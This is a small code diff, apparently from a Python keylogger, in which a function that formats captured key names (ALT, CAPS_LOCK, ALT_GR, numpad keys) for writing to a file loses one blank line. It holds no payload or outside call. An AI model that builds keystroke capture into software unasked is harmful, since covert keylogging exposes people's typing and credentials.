@@ -34,7 +34,6 @@ def write_to_file(key):
         letter = " <ALT> "
     elif letter == "Key.caps_lock":
         letter = " <CAPS_LOCK> "
-    
     elif letter == "Key.alt_gr":
         letter = " <ALT_GR> "
     elif letter in numpad_keys:
